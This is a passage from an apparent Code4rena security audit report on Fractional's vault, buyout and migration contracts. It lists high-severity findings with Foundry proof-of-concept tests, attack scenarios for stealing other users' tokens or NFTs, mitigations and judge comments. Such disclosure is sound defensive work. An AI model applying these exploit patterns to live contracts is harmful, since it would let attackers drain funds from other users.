+The test code below shows the first user (Alice) migrating their tokens to the new vault twice before the second user (Bob) callsmigrateFractionswhich then fails.
+functiontestMigrateFractionsAgain()public{// SetuptestSettle();(, , , ,addressnewVault, , , , ) =migrationModule.migrationInfo(vault,1);(addressnewToken,uint256id) =registry.vaultToToken(newVault);// First user migrates fractions twiceassertEq(IERC1155(newToken).balanceOf(address(migrationModule),id),TOTAL_SUPPLY*2);// Confirm Migration has all new tokensassertEq(getFractionBalance(alice.addr),4000);// Alice joined with 1 ether and 1000 fractionsalice.migrationModule.migrateFractions(vault,1);assertEq(IERC1155(newToken).balanceOf(alice.addr,id),6000);// Alice's shares == 6000assertEq(IERC1155(newToken).balanceOf(address(migrationModule),id),TOTAL_SUPPLY*2-6000);// Confirm Migration loses new tokensalice.migrationModule.migrateFractions(vault,1);assertEq(IERC1155(newToken).balanceOf(alice.addr,id),12000);// Confirm Alice gains 6000 new tokens againassertEq(IERC1155(newToken).balanceOf(address(migrationModule),id),8000);// Confirm Migration loses new tokens// Second user attempts to migrate fractionsassertEq(getFractionBalance(bob.addr),0);// Bob joined with 1 ether and 5000 fractions (all of his fractions)vm.expectRevert(stdError.arithmeticError);bob.migrationModule.migrateFractions(vault,1);// Bob is unable to call migrateFractions and gain new tokens because the migration module does not contain enough tokensassertEq(IERC1155(newToken).balanceOf(bob.addr,id),0);// Confirm Bob does not gain any new tokens (supposed to gain 14,000 tokens)}
+Recommended Mitigation Steps
+A possible fix might be to set theuserProposalEthanduserProposalFractionsto 0 after the user’s tokens have been migrated.
+mehtaculous (Fractional) confirmed
+HardlyDifficult (judge) increased severity to High and commented:
+migrateFractionscan be called multiple times, stealing funds from other users. This is a High risk issue.Selecting this submission as the primary for including a clear POC.
+
+[H-17] Proposal which started buyout which fails is able to settle migration as if its buyout succeeded.
+Submitted by panprog, also found by 0xsanson, bin2chen, hansfriese, kenzo, PwnedNoMore, smiling_heretic, Treasure-Seeker, and TrungOre
+If one proposal starts a buyout which fails, and then another proposal starts a buyout which succeeds, then both of them will be commited andsettleVaultcan be called on any of them. If it’s called on the failed proposal first, then it will settle even though buyout has failed (and it can proceed to withdraw all tokens to a new vault).
+Malicious proposal being able to successfully migrate scenario:
+Bob starts a malicious proposal to migrate with a lowtargetPrice, which immediately initiates a buyoutBuyout fails (but malicious proposal is marked ascommitted)Alice starts a good proposal to migrate, which goes on to buyout which eventually succeeds to get50%+ fractionsAlice ends the buyoutBob immediately callssettleVaultwith his malicious proposalBob’s malicious proposal settles (and he can go on to withdraw all tokens from the vault into his malicious proposal effectively stealing assets from Alice).
+Proof of Concept
+Add this code to test/Migration.t.sol
+function testPanprogBugH3() public {initializeMigration(alice, bob, 10000, 4000, true);(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();// Migrate to a vault with no permissions (just to test out migration)address[] memory newModules = new address[](2);newModules[0] = migration;newModules[1] = modules[1];// Bob makes the proposalbob.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2,1 ether);// Bob joins the proposal with 4000 fractionsbob.migrationModule.join{value: 1 ether}(vault, 1, 4000);// since the target price is reached, bob starts the buyoutbob.migrationModule.commit(vault, 1);vm.warp(rejectionPeriod + 1);// after buyout fails, bob ends it// note: bob's proposal is still commited even though it has failedbob.buyoutModule.end(vault, burnProof);bob.migrationModule.withdrawContribution(vault, 1);// Alice makes a different proposal (we use bob's data for simplicity)alice.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 10,1 ether);// Alice joins the proposal with 6000 fractionsalice.migrationModule.join{value: 1 ether}(vault, 2, 6000);// since the target price is reached, alice starts the buyoutalice.migrationModule.commit(vault, 2);vm.warp(proposalPeriod * 10);// after buyout succeeds (as it has >50% of fractions), alice ends it// note: both bob's and alice's proposals are commited at this pointalice.buyoutModule.end(vault, burnProof);// Now bob (whose buyout has failed) settles his proposal// It should revert, but it succeedsvm.expectRevert(abi.encodeWithSelector(IMigration.UnsuccessfulMigration.selector));bob.migrationModule.settleVault(vault, 2);}
+Recommended Mitigation Steps
+Add a new storage variable for currently active proposal id. Allow callingsettleVaultonly for active proposal id (and also only if buyout’s proposer equalsMigrationaddress, otherwise there can be a different successful buyout not connected to the active proposal). Also add appropriate checks with active proposal in the other functions as well (don’t allow to commit if there is an active proposal etc).
+Ferret-san (Fractional) confirmed
+HardlyDifficult (judge) commented:
+A failed migration can settle after a successful buyout. Agree this is High risk.Selecting this submission as the primary for including a clear coded POC.
+
+[H-18] The time constraint of selling fractions can be bypassed by directly transferring fraction tokens to the buyout contract
+Submitted by PwnedNoMore, also found by Treasure-Seeker
+Theendfunction in theBuyoutcontract usesIERC1155(token).balanceOf(address(this), id)to determine the amount of deposited fraction tokens without distinguishing whether those fraction tokens are depositied by thesellFractionsfunction or by direct transferring. Note that only thesellFractionsfunction is constrained byPROPOSAL_PERIOD.
+This vulnerability lets a 51-holder gain the whole batch of NFTs without paying for the rest 49% fractions.
+Assume a vault X creates 100 fraction tokens and the market-decided price of a fraction token is 1 ether (i.e., the ideal value of the locked NFTs in vault X is 100 ether). Let’s also assume that Alice holds 51 tokens (maybe by paying 51 ether on opensea).
+Followings are two scenarios, where the benign one follows the normal workflow and the malicious one exploits the vulnerability.
+Benign Scenario
+Alice starts a buyout by depositing her 51 fraction tokens and 49 ether, making thefractionPrice1 etherOther users are satisfied with the provided price, and hence no one buys or sells their fraction tokensThe buyout succeeds:Alice gets the locked NFTsOther fraction holders can invokecashto redeem their fraction tokens with a price of 1 etherAs a result, Alice paid 100 ether in total to get the locked NFTs.
+Malicious Scenario
+Alice starts a buyout by depositing 0 fraction tokens and 1 wei, making thefractionPrice0.01 wei.Note that Alice can create a separated account whose balance for the fraction token is 0, to start the buyoutNo one is satisfied with the price (0.01 wei v/s 1 ether) and hence they will try to buy fraction tokens to reject the buyoutSince there is not any fraction tokens locked in theBuyoutcontract from Alice, other users do not need to do anythingAlice invokes theendfunctionBut before invoking theendfunction,Alice directly invokesIERC1155(token).safeTransferFromto send the rest 51 fraction token to theBuyoutcontractTheendfunction will treat the buyout successful, since theIERC1155(token).balanceOf(address(this), id)is bigger than 50%The above two message calls happen in a single transaction, hence no one can front-runAs a resultAlice only paid 51 ether to get the locked NFTs whose value is 100 etherOther fraction holders get nothing (but they had paid for the fraction token before)
+In short, a malicious users can buy any NFT by just paying half of the NFT’s market price.
+Recommended Mitigation Steps
+For each buyout, add a new field to record the amount of fraction tokens deposited bysellFractions. And in theendfunction, use the newly-added field to determine whether the buyout can be processed or not.
+Ferret-san (Fractional) confirmed
+HardlyDifficult (judge) commented:
+Assets can be transferred in after a failed buyout to treat it as successful. Agree this is High risk.
+
+[H-19] Migration can permanently fail if user specifies different lengths forselectorsandplugins
+Submitted by scaraven, also found by berndartmueller
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99
+https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L174
+Impact
+Inpropose()in Migration.sol, there is no check that the lengths of theselectorsandpluginsarrays are the same. This means that if a migration is successful, theinstall()function in Vault.sol could revert beacuse we access an array out of bounds. This prevents a new vault being created thereby permanently locking assets inside the vault.
+Proof of Concept
+User starts a new migration proposal whereselectors.length != plugins.lengthEnough users join proposal and the buyout bid startsBuyout bid is successful and migration starts withsettleVault()A new vault is cloned withcreate()->registry.deployFor()->vault.install(selectors, plugins)a. Ifselectors.length > plugins.lengththen we get an out of bounds error and transaction revertsb. Ifselectors.length < plugins.lengththen the excess values inpluginsis ignored which is tolerableIn scenario a., the migration fails and a new migration cannot start so assets in the vault are permanently locked
+This may seem quite circumstantial as this problem only occurs if a user specifiesselectorsandpluginswrongly however it is very easy for an attacker to perform this maliciously with no cost on their behalf, it is highly unlikely that users will be able to spot a malicious migration.
+Tools Used
+VS Code
+Recommended Mitigation Steps
+Consider adding a check inpropose()to make sure that the lengths match i.e.
+functionpropose(address_vault,address[]calldata_modules,address[]calldata_plugins,bytes4[]calldata_selectors,uint256_newFractionSupply,uint256_targetPrice)external{// @Audit Make sure that selectors and plugins matchrequire(_selectors.length==_plugins.length,"Plugin lengths do not match");// Reverts if address is not a registered vault(,uint256id) =IVaultRegistry(registry).vaultToToken(_vault);if(id==0)revertNotVault(_vault);// Reverts if buyout state is not inactive(, ,Statecurrent, , , ) =IBuyout(buyout).buyoutInfo(_vault);Staterequired=State.INACTIVE;if(current!=required)revertIBuyout.InvalidState(required,current);// Initializes migration proposal infoProposalstorageproposal=migrationInfo[_vault][++nextId];proposal.startTime=block.timestamp;proposal.targetPrice=_targetPrice;proposal.modules=_modules;proposal.plugins=_plugins;proposal.selectors=_selectors;proposal.oldFractionSupply=IVaultRegistry(registry).totalSupply(_vault);proposal.newFractionSupply=_newFractionSupply;}
+Additionally, I would suggest adding such a check in theinstall()function as this may prevent similiar problems if new modules are added.
+stevennevins (Fractional) confirmed
+HardlyDifficult (judge) commented:
+A misconfiguration of a migration can result in permanently locked up funds. Agree with High risk here.
+
+[H-20] Migration’sleavefunction allows leaving a committed proposal
+Submitted by kenzo
+Theleavefunction allows to leave a proposal even if the proposal has been committed and failed.
+This makes it a (probably unintended) duplicate functionality ofwithdrawContributions, which is the function that should be used to withdraw failed contributions.
+Impact
+User assets might be lost:
+When withdrawing assets from a failed migration, users should get back a different amount of assets, according to the buyout auction result. (I detailed this in another issue - “Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back”).
+But when withdrawing assets from a proposal that has not been committed, users should get back their original amount of assets, as that has not changed.
+Therefore, ifleavedoes not check if the proposal has been committed, users could callleaveinstead ofwithdrawContributionand get back a different amounts of assets than they deserve, on the expense of other users.
+Proof of Concept
+Theleavefunctiondoes not checkanywhere whetherproposal.isCommited == true.
+Therefore, if a user calls it after a proposal has been committed and failed, it will continue to send him his original contribution back, instead of sending him the adjusted amount that has been returned from Buyout.
+Recommended Mitigation Steps
+Revert inleaveifproposal.isCommited == true.
+You might be also able to merge the functionality ofleaveandwithdrawContribution, but that depends on how you will implement the fix forwithdrawContribution.
+Ferret-san (Fractional) confirmed
+HardlyDifficult (judge) commented:
+Users can withdraw more than expected after a failed proposal, which leads to a deficit and loss of assets for others. Agree with High risk.
+
